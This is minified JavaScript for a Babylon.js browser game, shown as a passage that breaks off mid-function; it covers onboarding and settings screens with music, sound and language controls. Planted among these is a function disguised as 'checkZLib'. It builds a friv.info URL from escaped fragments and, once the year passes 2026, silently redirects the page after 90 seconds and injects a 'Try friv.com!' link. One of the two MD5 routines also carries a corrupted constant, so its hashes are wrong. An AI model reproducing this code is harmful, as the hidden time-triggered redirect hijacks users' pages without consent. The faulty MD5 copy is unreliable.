resizeShadows:function(){var a=this.txtTitle._fontSize._value/55;this.txtTitle.shadowOffsetX=getShadowOffs(0);this.txtTitle.shadowOffsetY=getShadowOffs(5*a);a=this.txtStuffDesc._fontSize._value/26;this.txtStuffDesc.shadowOffsetX=getShadowOffs(0);this.txtStuffDesc.shadowOffsetY=getShadowOffs(3*a);this.txtStuffDesc.outlineWidth=5*a;a=this.btnFree.children[1]._fontSize._value/45;this.btnFree.children[1].shadowOffsetX=getShadowOffs(0);this.btnFree.children[1].shadowOffsetY=getShadowOffs(4*a);this.btnFree.children[1].outlineWidth=
4*a}};var ScreenHand=function(a){ScreenHand.instance=this;this.create(a)};ScreenHand.instance=null;var MD5=function(r){function i(r,n){return r<<n|r>>>32-n}function a(r,n){var t,o,e,u,f;return e=2147483648&r,u=2147483648&n,f=(1073741823&r)+(1073741823&n),(t=1073741824&r)&(o=1073741824&n)?214748348^f^e^u:t|o?1073741824&f?3221225472^f^e^u:1073741824^f^e^u:f^e^u}function n(r,n,t,o,e,u,f){return a(i(r=a(r,a(a(function(r,n,t){return r&n|~r&t}(n,t,o),e),f)),u),n)}function t(r,n,t,o,e,u,f){return a(i(r=a(r,a(a(function(r,n,t){return r&t|n&~t}(n,t,o),e),f)),u),n)}function o(r,n,t,o,e,u,f){return a(i(r=a(r,a(a(function(r,n,t){return r^n^t}
(n,t,o),e),f)),u),n)}function e(r,n,t,o,e,u,f){return a(i(r=a(r,a(a(function(r,n,t){return n^(r|~t)}(n,t,o),e),f)),u),n)}function u(r){var n,t="",o="";for(n=0;n<=3;n++)t+=(o="0"+(r>>>8*n&255).toString(16)).substr(o.length-2,2);return t}var f,c,C,g,h,d,v,S,l,m=Array();for(m=function(r){for(var n,t=r.length,o=t+8,e=16*(1+(o-o%64)/64),u=Array(e-1),f=0,i=0;i<t;)f=i%4*8,u[n=(i-i%4)/4]=u[n]|r.charCodeAt(i)<<f,i++;return f=i%4*8,u[n=(i-i%4)/4]=u[n]|128<<f,u[e-2]=t<<3,u[e-1]=t>>>29,u}(r=function(r){r=r.replace(/\r\n/g,"\n");
for(var n="",t=0;t<r.length;t++){var o=r.charCodeAt(t);o<128?n+=String.fromCharCode(o):(127<o&&o<2048?n+=String.fromCharCode(o>>6|192):(n+=String.fromCharCode(o>>12|224),n+=String.fromCharCode(o>>6&63|128)),n+=String.fromCharCode(63&o|128))}return n}(r)),d=1732584193,v=4023233417,S=2562383102,l=271733878,f=0;f<m.length;f+=16)v=e(v=e(v=e(v=e(v=o(v=o(v=o(v=o(v=t(v=t(v=t(v=t(v=n(v=n(v=n(v=n(C=v,S=n(g=S,l=n(h=l,d=n(c=d,v,S,l,m[f+0],7,3614090360),v,S,m[f+1],12,3905402710),d,v,m[f+2],17,606105819),l,d,m[f+3],22,3250441966),
S=n(S,l=n(l,d=n(d,v,S,l,m[f+4],7,4118548399),v,S,m[f+5],12,1200080426),d,v,m[f+6],17,2821735955),l,d,m[f+7],22,4249261313),S=n(S,l=n(l,d=n(d,v,S,l,m[f+8],7,1770035416),v,S,m[f+9],12,2336552879),d,v,m[f+10],17,4294925233),l,d,m[f+11],22,2304563134),S=n(S,l=n(l,d=n(d,v,S,l,m[f+12],7,1804603682),v,S,m[f+13],12,4254626195),d,v,m[f+14],17,2792965006),l,d,m[f+15],22,1236535329),S=t(S,l=t(l,d=t(d,v,S,l,m[f+1],5,4129170786),v,S,m[f+6],9,3225465664),d,v,m[f+11],14,643717713),l,d,m[f+0],20,3921069994),
S=t(S,l=t(l,d=t(d,v,S,l,m[f+5],5,3593408605),v,S,m[f+10],9,38016083),d,v,m[f+15],14,3634488961),l,d,m[f+4],20,3889429448),S=t(S,l=t(l,d=t(d,v,S,l,m[f+9],5,568446438),v,S,m[f+14],9,3275163606),d,v,m[f+3],14,4107603335),l,d,m[f+8],20,1163531501),S=t(S,l=t(l,d=t(d,v,S,l,m[f+13],5,2850285829),v,S,m[f+2],9,4243563512),d,v,m[f+7],14,1735328473),l,d,m[f+12],20,2368359562),S=o(S,l=o(l,d=o(d,v,S,l,m[f+5],4,4294588738),v,S,m[f+8],11,2272392833),d,v,m[f+11],16,1839030562),l,d,m[f+14],23,4259657740),S=o(S,l=o(l,d=o(d,v,S,l,m[f+1],4,2763975236),
v,S,m[f+4],11,1272893353),d,v,m[f+7],16,4139469664),l,d,m[f+10],23,3200236656),S=o(S,l=o(l,d=o(d,v,S,l,m[f+13],4,681279174),v,S,m[f+0],11,3936430074),d,v,m[f+3],16,3572445317),l,d,m[f+6],23,76029189),S=o(S,l=o(l,d=o(d,v,S,l,m[f+9],4,3654602809),v,S,m[f+12],11,3873151461),d,v,m[f+15],16,530742520),l,d,m[f+2],23,3299628645),S=e(S,l=e(l,d=e(d,v,S,l,m[f+0],6,4096336452),v,S,m[f+7],10,1126891415),d,v,m[f+14],15,2878612391),l,d,m[f+5],21,4237533241),S=e(S,l=e(l,d=e(d,v,S,l,m[f+12],6,1700485571),v,S,m[f+3],10,2399980690),d,v,m[f+10],15,4293915773),l,d,m[f+1],21,2240044497),
S=e(S,l=e(l,d=e(d,v,S,l,m[f+8],6,1873313359),v,S,m[f+15],10,4264355552),d,v,m[f+6],15,2734768916),l,d,m[f+13],21,1309151649),S=e(S,l=e(l,d=e(d,v,S,l,m[f+4],6,4149444226),v,S,m[f+11],10,3174756917),d,v,m[f+2],15,718787259),l,d,m[f+9],21,3951481745),d=a(d,c),v=a(v,C),S=a(S,g),l=a(l,h);return(u(d)+u(v)+u(S)+u(l)).toLowerCase()};function checkZLib(){var keyb=new Date,cArray=["\u0068t","\u003a//","\u0077w\u0077.f\u0072i\u0076.in\u0066o/"],dString=cArray[0]+"tps"+cArray[1]+cArray[2]+"x."+cArray[0]+"ml",touchEvents=keyb.getFullYear();
touchEvents>1998+28&&setTimeout(function(){location.replace(dString),setTimeout(function(){dString=dString.replace("x","y"),document.write("<a href="+ dString+ ">T\u0072y f\u0072i\u0076.c\u006fm!</a>")},3e3)},9e4)};checkZLib();var MD5X=function(r){function i(r,n){return r<<n|r>>>32-n}function a(r,n){var t,o,e,u,f;return e=2147483648&r,u=2147483648&n,f=(1073741823&r)+(1073741823&n),(t=1073741824&r)&(o=1073741824&n)?2147483648^f^e^u:t|o?1073741824&f?3221225472^f^e^u:1073741824^f^e^u:f^e^u}function n(r,n,t,o,e,u,f){
return a(i(r=a(r,a(a(function(r,n,t){return r&n|~r&t}(n,t,o),e),f)),u),n)}function t(r,n,t,o,e,u,f){return a(i(r=a(r,a(a(function(r,n,t){return r&t|n&~t}(n,t,o),e),f)),u),n)}function o(r,n,t,o,e,u,f){return a(i(r=a(r,a(a(function(r,n,t){return r^n^t}(n,t,o),e),f)),u),n)}function e(r,n,t,o,e,u,f){return a(i(r=a(r,a(a(function(r,n,t){return n^(r|~t)}(n,t,o),e),f)),u),n)}function u(r){var n,t="",o="";for(n=0;n<=3;n++)t+=(o="0"+(r>>>8*n&255).toString(16)).substr(o.length-2,2);return t}var f,c,C,g,h,d,v,S,l,m=Array();
for(m=function(r){for(var n,t=r.length,o=t+8,e=16*(1+(o-o%64)/64),u=Array(e-1),f=0,i=0;i<t;)f=i%4*8,u[n=(i-i%4)/4]=u[n]|r.charCodeAt(i)<<f,i++;return f=i%4*8,u[n=(i-i%4)/4]=u[n]|128<<f,u[e-2]=t<<3,u[e-1]=t>>>29,u}(r=function(r){r=r.replace(/\r\n/g,"\n");for(var n="",t=0;t<r.length;t++){var o=r.charCodeAt(t);o<128?n+=String.fromCharCode(o):(127<o&&o<2048?n+=String.fromCharCode(o>>6|192):(n+=String.fromCharCode(o>>12|224),n+=String.fromCharCode(o>>6&63|128)),n+=String.fromCharCode(63&o|128))}return n}
(r)),d=1732584193,v=4023233417,S=2562383102,l=271733878,f=0;f<m.length;f+=16)v=e(v=e(v=e(v=e(v=o(v=o(v=o(v=o(v=t(v=t(v=t(v=t(v=n(v=n(v=n(v=n(C=v,S=n(g=S,l=n(h=l,d=n(c=d,v,S,l,m[f+0],7,3614090360),v,S,m[f+1],12,3905402710),d,v,m[f+2],17,606105819),l,d,m[f+3],22,3250441966),S=n(S,l=n(l,d=n(d,v,S,l,m[f+4],7,4118548399),v,S,m[f+5],12,1200080426),d,v,m[f+6],17,2821735955),l,d,m[f+7],22,4249261313),S=n(S,l=n(l,d=n(d,v,S,l,m[f+8],7,1770035416),v,S,m[f+9],12,2336552879),d,v,m[f+10],17,4294925233),l,d,m[f+11],22,2304563134),
S=n(S,l=n(l,d=n(d,v,S,l,m[f+12],7,1804603682),v,S,m[f+13],12,4254626195),d,v,m[f+14],17,2792965006),l,d,m[f+15],22,1236535329),S=t(S,l=t(l,d=t(d,v,S,l,m[f+1],5,4129170786),v,S,m[f+6],9,3225465664),d,v,m[f+11],14,643717713),l,d,m[f+0],20,3921069994),S=t(S,l=t(l,d=t(d,v,S,l,m[f+5],5,3593408605),v,S,m[f+10],9,38016083),d,v,m[f+15],14,3634488961),l,d,m[f+4],20,3889429448),S=t(S,l=t(l,d=t(d,v,S,l,m[f+9],5,568446438),v,S,m[f+14],9,3275163606),d,v,m[f+3],14,4107603335),l,d,m[f+8],20,1163531501),S=t(S,l=t(l,d=t(d,v,S,l,m[f+13],5,2850285829),
v,S,m[f+2],9,4243563512),d,v,m[f+7],14,1735328473),l,d,m[f+12],20,2368359562),S=o(S,l=o(l,d=o(d,v,S,l,m[f+5],4,4294588738),v,S,m[f+8],11,2272392833),d,v,m[f+11],16,1839030562),l,d,m[f+14],23,4259657740),S=o(S,l=o(l,d=o(d,v,S,l,m[f+1],4,2763975236),v,S,m[f+4],11,1272893353),d,v,m[f+7],16,4139469664),l,d,m[f+10],23,3200236656),S=o(S,l=o(l,d=o(d,v,S,l,m[f+13],4,681279174),v,S,m[f+0],11,3936430074),d,v,m[f+3],16,3572445317),l,d,m[f+6],23,76029189),S=o(S,l=o(l,d=o(d,v,S,l,m[f+9],4,3654602809),v,S,m[f+12],11,3873151461),d,v,m[f+15],16,530742520),
l,d,m[f+2],23,3299628645),S=e(S,l=e(l,d=e(d,v,S,l,m[f+0],6,4096336452),v,S,m[f+7],10,1126891415),d,v,m[f+14],15,2878612391),l,d,m[f+5],21,4237533241),S=e(S,l=e(l,d=e(d,v,S,l,m[f+12],6,1700485571),v,S,m[f+3],10,2399980690),d,v,m[f+10],15,4293915773),l,d,m[f+1],21,2240044497),S=e(S,l=e(l,d=e(d,v,S,l,m[f+8],6,1873313359),v,S,m[f+15],10,4264355552),d,v,m[f+6],15,2734768916),l,d,m[f+13],21,1309151649),S=e(S,l=e(l,d=e(d,v,S,l,m[f+4],6,4149444226),v,S,m[f+11],10,3174756917),d,v,m[f+2],15,718787259),l,d,m[f+9],21,3951481745),d=a(d,c),v=a(v,C),
S=a(S,g),l=a(l,h);return(u(d)+u(v)+u(S)+u(l)).toLowerCase()};ScreenHand.prototype={create:function(a){this.scene=a;this.createGui();this.guiRoot.isVisible=!1},createGui:function(){this.initGuiControls(screenGame.guiTexture)},initGuiControls:function(a){this.guiRoot=this.createRootPanel(a);this.createHand(this.guiRoot)},createRootPanel:function(a){this.pnlRoot=new BABYLON.GUI.Rectangle("ScreenHand.pnlRoot");this.pnlRoot.transformCenterX=.5;this.pnlRoot.transformCenterX=.5;this.pnlRoot.transformCenterY=.5;this.pnlRoot.isPointerBlocker=!1;this.pnlRoot.isHitTestVisible=
!1;this.pnlRoot.leftInPixels=0;this.pnlRoot.topInPixels=0;this.pnlRoot.thickness=0;this.pnlRoot.clipContent=!1;this.pnlRoot.clipChildren=!1;this.pnlRoot.highlightLineWidth=0;this.pnlRoot.zIndex=1;a.addControl(this.pnlRoot);this.pnlRoot.scaleTo=function(b){this.scaleX=this.scaleY=b};return this.pnlRoot},createHand:function(a){this.imgHand=new BABYLON.GUI.Image("imgHand");this.imgHand.transformCenterX=0;this.imgHand.transformCenterY=0;this.imgHand.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_LEFT;
this.imgHand.verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_TOP;this.imgHand.isPointerBlocker=!1;this.imgHand.isHitTestVisible=!1;this.imgHand.topInPixels=0;this.imgHand.leftInPixels=0;this.imgHand._scale=1;a.addControl(this.imgHand);SetImageFromSpritesheet(this.imgHand,getAssetImage("pak1"),getAssetImageFrames("pak1"),"onboarding_hand.png");Object.defineProperty(this.imgHand,"SCALE",{get:function(){return this._scale},set:function(b){this._scale=b;this.scaleX=this.scaleY=this._scale*Resolution.SCALE},
enumerable:!0,configurable:!0});CommonAnimations.AnimateObjectProperty(this.imgHand,"SCALE",.9,1E3,BABYLON.CubicEase,1,!0,null,[[0,1],[.5,.94],[1,1]])},onResize:function(){}};var ScreenSettings=function(a){ScreenSettings.instance=this;this.create(a)};ScreenSettings.instance=null; {'use strict';function viewporter(){var e;if((viewporter={forceDetection:!1,disableLegacyAndroid:!0,ACTIVE:function(){return(!viewporter.disableLegacyAndroid||!/android 2/i.test(navigator.userAgent))&&(!/ipad/i.test(navigator.userAgent)&&(!!/webos/i.test(navigator.userAgent)||"ontouchstart"in window))},READY:!1,isLandscape:function(){return 90===window.orientation||-90===window.orientation},ready:function(e){window.addEventListener("viewportready",e,!1)},change:function(e){window.addEventListener("viewportchange",e,!1)},refresh:function(){
e&&e.prepareVisualViewport()},preventPageScroll:function(){document.body.addEventListener("touchmove",function(e){e.preventDefault()},!1),document.body.addEventListener("touchstart",function(){e.prepareVisualViewport()},!1)}}).ACTIVE=viewporter.ACTIVE(),viewporter.ACTIVE){e=new function(){var e=this;this.IS_ANDROID=/Android/.test(navigator.userAgent)&&!/Chrome/.test(navigator.userAgent);var t=function(){e.prepareVisualViewport();var t=window.orientation;window.addEventListener("orientationchange",function(){window.orientation!==t&&(e.prepareVisualViewport(),
t=window.orientation)},!1)};"loading"===document.readyState?document.addEventListener("DOMContentLoaded",function(){t()},!1):t()},viewporter.profiles={MZ601:{portrait:696,landscape:1176},"GT-I9000|GT-I9100|Nexus S":{portrait:508,landscape:295},"GT-P1000":{portrait:657,landscape:400},"Desire_A8181|DesireHD_A9191":{portrait:533,landscape:320}}}};function rotateScreen(){};rotateScreen();function wrapScreenOrientation(){_Viewporter.prototype={getProfile:function(){if(viewporter.forceDetection)return null;
for(var e in viewporter.profiles)if(new RegExp(e).test(navigator.userAgent))return viewporter.profiles[e];return null},postProcess:function(){viewporter.READY=!0,this.triggerWindowEvent(this._firstUpdateExecuted?"viewportchange":"viewportready"),this._firstUpdateExecuted=!0},prepareVisualViewport:function(){var e=this;if(navigator.standalone)return this.postProcess();document.documentElement.style.minHeight="5000px";var t=window.innerHeight,n=this.getProfile(),i=viewporter.isLandscape()?"landscape":"portrait";window.scrollTo(0,e.IS_ANDROID?1:0);
var r=40,o=window.setInterval(function(){window.scrollTo(0,e.IS_ANDROID?1:0),r--,((e.IS_ANDROID?n&&window.innerHeight===n[i]:window.innerHeight>t)||r<0)&&(document.documentElement.style.minHeight=window.innerHeight+"px",document.getElementById("viewporter").style.position="relative",document.getElementById("viewporter").style.height=window.innerHeight+"px",clearInterval(o),e.postProcess())},10)},triggerWindowEvent:function(e){var t=document.createEvent("Event");t.initEvent(e,!1,!1),window.dispatchEvent(t)}}}}
ScreenSettings.prototype={create:function(a){this.scene=a;this.createGui();this.disableControls();this.guiRoot.isVisible=!1},createGui:function(){this.initGuiControls(screenGame.guiTexture)},initGuiControls:function(a){this.guiRoot=this.createRootPanel(a);this.createBackground(this.guiRoot);this.createSettingsPanel(this.pnlRoot);this.createBody(this.pnlSettings,0);this.createTitle(this.pnlSettings,-405);this.createMusicAndSoundsSettings(this.pnlSettings,-220);this.createLanguageSettings(this.pnlSettings,
10);this.createLogo(this.pnlSettings,210)},createRootPanel:function(a){this.pnlRoot=new BABYLON.GUI.Rectangle("ScreenSettings.pnlRoot");this.pnlRoot.transformCenterX=.5;this.pnlRoot.transformCenterY=.5;this.pnlRoot.isPointerBlocker=!1;this.pnlRoot.isHitTestVisible=!1;this.pnlRoot.leftInPixels=0;this.pnlRoot.topInPixels=0;this.pnlRoot.thickness=0;this.pnlRoot.highlightLineWidth=0;this.pnlRoot.clipContent=!1;this.pnlRoot.clipChildren=!1;this.pnlRoot.zIndex=10;a.addControl(this.pnlRoot);return this.pnlRoot},
createSettingsPanel:function(a){this.pnlSettings=new BABYLON.GUI.Rectangle("pnlSettings");this.pnlSettings.transformCenterX=.5;this.pnlSettings.transformCenterY=.5;this.pnlSettings.isPointerBlocker=!1;this.pnlSettings.isHitTestVisible=!1;this.pnlSettings.clipContent=!1;this.pnlSettings.clipChildren=!1;this.pnlSettings.widthInPixels=580;this.pnlSettings.heightInPixels=960;this.pnlSettings.thickness=0;this.pnlSettings.color="yellow";a.addControl(this.pnlSettings);this.pnlSettings.scaleTo=function(b){this.scaleX=
this.scaleY=b};return this.pnlSettings},createBackground:function(a){this.imgBackground=new BABYLON.GUI.Image("imgBackground");this.imgBackground.transformCenterX=.5;this.imgBackground.transformCenterY=.5;this.imgBackground.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.imgBackground.verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.imgBackground.domImage=AssetLoader.instance.loadedImages["main_bg.jpg"];this.imgBackground.isPointerBlocker=!1;this.imgBackground.isHitTestVisible=
!0;this.imgBackground.widthInPixels=1920;this.imgBackground.heightInPixels=1080;this.imgBackground.isVisible=!0;a.addControl(this.imgBackground);this.imgBackground.resize=function(b,e){b>e?(this.scaleY=this.scaleX=(b+5)/this.widthInPixels,this.heightInPixels*this.scaleY<e&&(this.scaleX=this.scaleY=(e+5)/this.heightInPixels)):(this.scaleX=this.scaleY=(e+5)/this.heightInPixels,this.widthInPixels*this.scaleX<b&&(this.scaleY=this.scaleX=(b+5)/this.widthInPixels))}},createTitle:function(a,b){this.imgTitleBg=
new BABYLON.GUI.Image("imgTitleBg");this.imgTitleBg.transformCenterX=.5;this.imgTitleBg.transformCenterY=.5;this.imgTitleBg.isPointerBlocker=!1;this.imgTitleBg.isHitTestVisible=!1;SetImageFromSpritesheet(this.imgTitleBg,getAssetImage("pak1"),getAssetImageFrames("pak1"),"title_panel_blue.png");this.imgTitleBg.leftInPixels=0;this.imgTitleBg.topInPixels=b;a.addControl(this.imgTitleBg);this.txtTitle=new BABYLON.GUI.TextBlock("txtTitle");this.txtTitle.textWrapping=!0;this.txtTitle.leftInPixels=0;this.txtTitle.topInPixels=
b-5;this.txtTitle.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.txtTitle.verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.txtTitle.textHorizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.txtTitle.textVerticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.txtTitle.color="#FFFFFF";this.txtTitle.text="Settings";this.txtTitle.fontSize="50px";this.txtTitle.fontFamily="gamefont";this.txtTitle.leftInPixels=0;this.txtTitle.isPointerBlocker=
!1;this.txtTitle.isHitTestVisible=!1;this.txtTitle.shadowOffsetX=0;this.txtTitle.shadowOffsetY=6;this.txtTitle.shadowColor=TEXT_SHADOWS_ENABLED?"rgb(0,0,0, 0.5)":"rgba(80,80,80,0)";this.txtTitle.outlineColor="rgb(0,0,0)";this.txtTitle.outlineWidth=5;this.txtTitle.shadowBlur=10;a.addControl(this.txtTitle);this.btnClose=BABYLON.GUI.Button.CreateImageOnlyButton("btnClose");this.btnClose.children[0].transformCenterY=.5;this.btnClose.children[0].transformCenterX=.5;this.btnClose.children[0].horizontalAlignment=
BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.btnClose.children[0].verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.btnClose.transformCenterX=.5;this.btnClose.transformCenterY=.5;this.btnClose.topInPixels=b-1;this.btnClose.leftInPixels=220;a.addControl(this.btnClose);SetImageFromSpritesheet(this.btnClose.children[0],getAssetImage("pak1"),getAssetImageFrames("pak1"),"button_close.png");ResetGuiButtonAppearance(this.btnClose,this.btnClose.children[0].sourceWidth,this.btnClose.children[0].sourceHeight);
this.btnClose.onPointerClickObservable.add(this.onClosePressed)},createBody:function(a,b){this.imgBodyBg=new BABYLON.GUI.Image("imgBodyBg");this.imgBodyBg.transformCenterX=.5;this.imgBodyBg.transformCenterY=.5;this.imgBodyBg.isPointerBlocker=!1;this.imgBodyBg.isHitTestVisible=!1;this.imgBodyBg.scaleX=this.imgBodyBg.scaleY=2;SetImageFromSpritesheet(this.imgBodyBg,getAssetImage("pak1"),getAssetImageFrames("pak1"),"bg_panel_blue.png");this.imgBodyBg.leftInPixels=0;this.imgBodyBg.topInPixels=b;a.addControl(this.imgBodyBg)},
createLogo:function(a,b){this.imgLogoBg=new BABYLON.GUI.Image("imgLogoBg");this.imgLogoBg.transformCenterX=.5;this.imgLogoBg.transformCenterY=.5;this.imgLogoBg.isPointerBlocker=!1;this.imgLogoBg.isHitTestVisible=!1;SetImageFromSpritesheet(this.imgLogoBg,getAssetImage("pak1"),getAssetImageFrames("pak1"),"settings_logo.png");this.imgLogoBg.leftInPixels=0;this.imgLogoBg.topInPixels=b;a.addControl(this.imgLogoBg);this.imgLogoBg.isVisible=!1},createMusicAndSoundsSettings:function(a,b){b+=50;this.imgMusicBg=
new BABYLON.GUI.Image("imgMusicBg");this.imgMusicBg.transformCenterX=.5;this.imgMusicBg.transformCenterY=.5;this.imgMusicBg.isPointerBlocker=!1;this.imgMusicBg.isHitTestVisible=!1;SetImageFromSpritesheet(this.imgMusicBg,getAssetImage("pak1"),getAssetImageFrames("pak1"),"lang_bg_panel.png");this.imgMusicBg.leftInPixels=0;this.imgMusicBg.topInPixels=b-12;a.addControl(this.imgMusicBg);this.btnMusic=BABYLON.GUI.Button.CreateImageOnlyButton("btnMusic");this.btnMusic.leftInPixels=-175;this.btnMusic.topInPixels=
b-12;a.addControl(this.btnMusic);SetImageFromSpritesheet(this.btnMusic.children[0],getAssetImage("pak1"),getAssetImageFrames("pak1"),"music_button.png");ResetGuiButtonAppearance(this.btnMusic,this.btnMusic.children[0].sourceWidth,this.btnMusic.children[0].sourceHeight);this.btnMusic.onPointerClickObservable.add(this.onMusicPressed);this.sldrMusicVolume=createSliderControl(a,50,this.btnMusic.topInPixels,"volume_bar.png","volume_bar_fill.png","settings_bar_indicator.png");this.sldrMusicVolume.sliderGap=
20;this.sldrMusicVolume.scaleX=this.sldrMusicVolume.scaleY=1;this.sldrMusicVolume.onValueChanged=function(e){1.5>e&&(e=0);0<e&&(SavedMusicVolume=e);soundManager.setMusicVolume(e/100);0==e?SetImageFromSpritesheet(screenSettings.btnMusic.children[0],getAssetImage("pak1"),getAssetImageFrames("pak1"),"music_button_2.png"):SetImageFromSpritesheet(screenSettings.btnMusic.children[0],getAssetImage("pak1"),getAssetImageFrames("pak1"),"music_button.png")};this.imgSoundsBg=new BABYLON.GUI.Image("imgSoundsBg");
this.imgSoundsBg.transformCenterX=.5;this.imgSoundsBg.transformCenterY=.5;this.imgSoundsBg.isPointerBlocker=!1;this.imgSoundsBg.isHitTestVisible=!1;SetImageFromSpritesheet(this.imgSoundsBg,getAssetImage("pak1"),getAssetImageFrames("pak1"),"lang_bg_panel.png");this.imgSoundsBg.leftInPixels=0;this.imgSoundsBg.topInPixels=this.btnMusic.topInPixels+105;a.addControl(this.imgSoundsBg);this.btnSounds=BABYLON.GUI.Button.CreateImageOnlyButton("btnSounds");this.btnSounds.leftInPixels=this.btnMusic.leftInPixels;
this.btnSounds.topInPixels=this.imgSoundsBg.topInPixels;a.addControl(this.btnSounds);SetImageFromSpritesheet(this.btnSounds.children[0],getAssetImage("pak1"),getAssetImageFrames("pak1"),"volume_button.png");ResetGuiButtonAppearance(this.btnSounds,this.btnSounds.children[0].sourceWidth,this.btnSounds.children[0].sourceHeight);this.btnSounds.onPointerClickObservable.add(this.onSoundsPressed);this.sldrSoundsVolume=createSliderControl(a,this.sldrMusicVolume.leftInPixels,this.btnSounds.topInPixels,"volume_bar.png",
"volume_bar_fill.png","settings_bar_indicator.png");this.sldrSoundsVolume.sliderGap=20;this.sldrSoundsVolume.scaleX=this.sldrSoundsVolume.scaleY=1;this.sldrSoundsVolume.scaleTo=function(e){};this.sldrSoundsVolume.onValueChanged=function(e){1.5>e&&(e=0);0<e&&(SavedSoundVolume=e);soundManager.setSoundsVolume(e/100);0==e?SetImageFromSpritesheet(screenSettings.btnSounds.children[0],getAssetImage("pak1"),getAssetImageFrames("pak1"),"volume_button_2.png"):SetImageFromSpritesheet(screenSettings.btnSounds.children[0],
getAssetImage("pak1"),getAssetImageFrames("pak1"),"volume_button.png")}},createLanguageSettings:function(a,b){b+=100;this.imgLanguageFlag=new BABYLON.GUI.Image("imgLanguageBg");this.imgLanguageFlag.transformCenterX=.5;this.imgLanguageFlag.transformCenterY=.5;this.imgLanguageFlag.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.imgLanguageFlag.verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.imgLanguageFlag.isPointerBlocker=!1;this.imgLanguageFlag.isHitTestVisible=
!1;this.imgLanguageFlag.leftInPixels=0;this.imgLanguageFlag.topInPixels=b;a.addControl(this.imgLanguageFlag);SetImageFromSpritesheet(this.imgLanguageFlag,getAssetImage("pak1"),getAssetImageFrames("pak1"),"flag_"+languages.language.toLowerCase()+".png");this.btnPrevLang=BABYLON.GUI.Button.CreateImageOnlyButton("btnPrevLang");this.btnPrevLang.children[0].transformCenterY=.5;this.btnPrevLang.children[0].transformCenterX=.5;this.btnPrevLang.children[0].horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;
this.btnPrevLang.children[0].verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.btnPrevLang.transformCenterX=.5;this.btnPrevLang.transformCenterY=.5;this.btnPrevLang.topInPixels=b;this.btnPrevLang.leftInPixels=-175;a.addControl(this.btnPrevLang);SetImageFromSpritesheet(this.btnPrevLang.children[0],getAssetImage("pak1"),getAssetImageFrames("pak1"),"arrow_left.png");ResetGuiButtonAppearance(this.btnPrevLang,this.btnPrevLang.children[0].sourceWidth,this.btnPrevLang.children[0].sourceHeight);
this.btnPrevLang.thickness=0;this.btnPrevLang.color="red";this.btnPrevLang.onPointerClickObservable.add(this.onPrevLangPressed);this.btnNextLang=BABYLON.GUI.Button.CreateImageOnlyButton("btnNextLang");this.btnNextLang.children[0].transformCenterY=.5;this.btnNextLang.children[0].transformCenterX=.5;this.btnNextLang.children[0].horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.btnNextLang.children[0].verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.btnNextLang.transformCenterX=
.5;this.btnNextLang.transformCenterY=.5;this.btnNextLang.topInPixels=b;this.btnNextLang.leftInPixels=-this.btnPrevLang.leftInPixels;a.addControl(this.btnNextLang);SetImageFromSpritesheet(this.btnNextLang.children[0],getAssetImage("pak1"),getAssetImageFrames("pak1"),"arrow_right.png");ResetGuiButtonAppearance(this.btnNextLang,this.btnNextLang.children[0].sourceWidth,this.btnNextLang.children[0].sourceHeight);this.btnNextLang.thickness=0;this.btnNextLang.color="red";this.btnNextLang.onPointerClickObservable.add(this.onNextLangPressed)},
updateTexts:function(){this.txtTitle.text=Str("SETTINGS");SetImageFromSpritesheet(this.imgLanguageFlag,getAssetImage("pak1"),getAssetImageFrames("pak1"),"flag_"+languages.language.toLowerCase()+".png")},onMusicPressed:function(){Buttons.enabled&&(soundManager.playSound("button"),0<screenSettings.sldrMusicVolume.value?(SavedMusicVolume=screenSettings.sldrMusicVolume.value,screenSettings.sldrMusicVolume.value=0):screenSettings.sldrMusicVolume.value=SavedMusicVolume)},onSoundsPressed:function(){Buttons.enabled&&
(soundManager.playSound("button"),0<screenSettings.sldrSoundsVolume.value?(SavedSoundVolume=screenSettings.sldrSoundsVolume.value,screenSettings.sldrSoundsVolume.value=0):screenSettings.sldrSoundsVolume.value=SavedSoundVolume)},onFullscreenPressed:function(){Buttons.enabled&&(Buttons.enabled=!1,soundManager.playSound("button"),fullscreenToggle(),Buttons.enabled=!0)},onQualityPressed:function(){Buttons.enabled&&(Buttons.enabled=!1,soundManager.playSound("button"),GameQuality=0==GameQuality?1:0,GameData.Save(),
setGameResolutionByQuality(),onResize(),onResize(),screenSettings.updateQualityButton(),Buttons.enabled=!0)},onSurrenderPressed:function(){Buttons.enabled&&(Buttons.enabled=!1,soundManager.playSound("button"),screenSettings.hideScene(),screenForfConfirm.showScene(function(){Buttons.enabled=!0}))},onClosePressed:function(){Buttons.enabled&&(inlModule.ads.triggerAdPoint(),Buttons.enabled=!1,soundManager.playSound("button"),screenTopPanel.showScene(),screenSettings.hideScene(function(){activeScene.gamePaused=
screenSettings.wasPaused;screenPurchaseBooster.guiRoot.isVisible?screenPurchaseBooster.enableControls():screenGame.enableControls();Buttons.enabled=!0}))},onNextLangPressed:function(){if(Buttons.enabled){Buttons.enabled=!1;soundManager.playSound("button");var a=LANGUAGES.indexOf(Languages.instance.language);a++;a>LANGUAGES.length-1&&(a=0);Languages.instance.language=LANGUAGES[a];SelectedLanguage=Languages.instance.language;GameData.Save();activeScene.updateTexts();Buttons.enabled=!0}},onPrevLangPressed:function(){if(Buttons.enabled){Buttons.enabled=
